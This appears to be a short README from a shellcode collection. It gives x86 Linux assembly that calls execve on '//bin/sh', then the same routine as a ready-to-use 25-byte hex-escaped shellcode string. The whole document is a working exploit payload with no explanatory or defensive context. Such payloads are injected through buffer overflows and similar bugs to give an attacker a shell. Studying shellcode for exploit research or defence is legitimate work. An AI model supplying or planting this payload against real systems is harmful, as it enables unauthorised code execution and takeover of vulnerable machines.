'sh' shell shellcode
====

# x86 version

<pre>
xor    eax,eax
push   eax
mov    edx,esp
push   0x68732f6e
push   0x69622f2f
mov    ebx,esp
push   eax
push   ebx
mov    ecx,esp
mov    al,0xb
int    0x80
</pre>

Read the asm file for the commented version

Shellcode

<pre>
"\x31\xc0\x50\x89\xe2\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
</pre>

Length : 25 bytes